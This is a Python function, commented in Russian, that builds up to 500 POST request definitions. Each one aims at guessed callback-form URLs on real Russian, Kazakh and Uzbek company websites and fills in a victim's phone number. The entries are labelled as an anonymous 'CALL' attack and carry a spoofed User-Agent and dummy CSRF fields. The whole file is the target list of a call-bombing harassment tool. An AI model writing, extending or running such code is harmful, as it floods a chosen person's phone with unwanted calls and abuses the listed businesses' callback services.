def callback_urls(number):
    """
    500+ сервисов обратного звонка.
    Генерируется из списка доменов + набора эндпоинтов + вариантов формы.
    """
    # Реальные домены компаний (РФ/СНГ) — base без протокола
    domains = [
        "wildberries.ru", "ozon.ru", "mvideo.ru", "eldorado.ru",
        "dns-shop.ru", "citilink.ru", "technopark.ru", "holodilnik.ru",
        "btc.ru", "restore.ru", "sulpak.kz", "technodom.kz",
        "mechta.kz", "dodopizza.ru", "papajohns.ru", "dominos.ru",
        "sushimaster.ru", "sushiwok.ru", "osaka.ru", "yaponapapa.ru",
        "pizzahut.ru", "burgerking.ru", "tanuki.ru", "freshmenu.ru",
        "mts.ru", "beeline.ru", "megafon.ru", "tele2.ru",
        "yota.ru", "rt.ru", "domru.ru", "ttk.ru",
        "sberbank.ru", "vtb.ru", "alfabank.ru", "tinkoff.ru",
        "gazprombank.ru", "rosbank.ru", "homecredit.ru", "sovcombank.ru",
        "qiwi.ru", "ingos.ru", "reso.ru", "rgs.ru",
        "sogaz.ru", "alfastrah.ru", "vsk.ru",
        "invitro.ru", "gemotest.ru", "kdl.ru", "medsi.ru",
        "docdoc.ru", "sberhealth.ru", "budzdorov.ru", "apteka.ru",
        "eapteka.ru", "aeroflot.ru", "s7.ru", "utair.ru",
        "pobeda.ru", "rzd.ru", "tutu.ru", "ostrovok.ru",
        "travelata.ru", "skillbox.ru", "gb.ru", "netology.ru",
        "cian.ru", "domclick.ru", "avito.ru", "n1.ru",
        "youdo.com", "profi.ru", "cleanbee.ru",
        "ngs.ru", "e1.ru", "74.ru", "ufa1.ru", "nn.ru", "63.ru",
        "msk1.ru", "krasnodar.ru", "rostov.ru", "sochi.ru",
        "kazan.ru", "ekaterinburg.ru", "novosibirsk.ru",
        "spb.ru", "mos.ru", "samara.ru", "chel.ru", "perm.ru",
        "voronezh.ru", "volgograd.ru", "ufa.ru", "krasnoyarsk.ru",
        "irkutsk.ru", "tomsk.ru", "barnaul.ru", "orenburg.ru",
        "penza.ru", "saratov.ru", "ulyanovsk.ru", "tver.ru",
        "yaroslavl.ru", "ryazan.ru", "lipetsk.ru", "tula.ru",
        "kaluga.ru", "smolensk.ru", "pskoff.ru", "novgorod.ru",
        "vladimir.ru", "ivanovo.ru", "kostroma.ru",
        # Узбекские
        "uz.news", "darakchi.uz", "kun.uz", "daryo.uz",
        "olx.uz", "uyshop.uz", "mediapark.uz", "texnomart.uz",
        "goodzone.uz", "asaxiy.uz", "zoomshop.uz",
    ]

    # Пути-эндпоинты для формы звонка
    paths = [
        "/callback", "/callme", "/zvonok", "/call-back",
        "/request-call", "/order-call", "/api/callback",
        "/ajax/callback", "/callback.php", "/send-call",
        "/call-request", "/forms/callback", "/callback-api",
        "/telephone", "/obratniy-zvonok",
        "/consultation", "/contact-form",
    ]

    # Варианты полей формы
    payloads = [
        {"phone": number},
        {"phone_number": number},
        {"PHONE": number},
        {"telephone": number},
        {"tel": number},
        {"callback_phone": number},
        {"client_phone": number},
        {"contact_phone": number},
        {"mobile_phone": number},
        {"phoneNumber": number},
        {"UserPhone": number},
        {"callbackPhone": number},
        {"phone-number": number},
        {"f_phone": number},
        {"phone1": number},
        {"phone_1": number},
        {"user-tel": number},
        {"CALLBACK_PHONE": number},
        {"USER_PHONE": number},
        {"phone": number, "action": "callback"},
        {"phone": number, "form": "callback"},
        {"phone": number, "name": "client"},
        {"tel": number, "name": "client"},
        {"phone": number, "name": "call"},
        {"phone": number, "action": "call_request"},
        {"phone": number, "type": "callback"},
        {"phone": number, "source": "site"},
        {"phone": number, "callback": "1"},
    ]

    headers_ua = "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36"

    services = []
    idx = 0
    for domain in domains:
        for path in paths[:3]:  # 3 пути на домен
            for _ in range(2):  # 2 варианта полей
                if len(services) >= 500:
                    return services

                data = payloads[idx % len(payloads)].copy()
                # Добавляем CSRF/токен для разнообразия
                if idx % 4 == 0:
                    data["_token"] = "cb"
                elif idx % 4 == 1:
                    data["csrf"] = "token"

                url = f"https://www.{domain}{path}" if not domain.startswith("uz.") else f"https://{domain}{path}"

                services.append({
                    'info': {
                        'country': 'RU' if not domain.endswith('.uz') else 'UZ',
                        'attack': 'CALL',
                        'website': domain,
                        'anonymous': 'Yes',
                    },
                    'method': 'post',
                    'url': url,
                    'headers': {
                        'User-Agent': headers_ua,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Accept': '*/*',
                    },
                    'data': data,
                })
                idx += 1

    return services
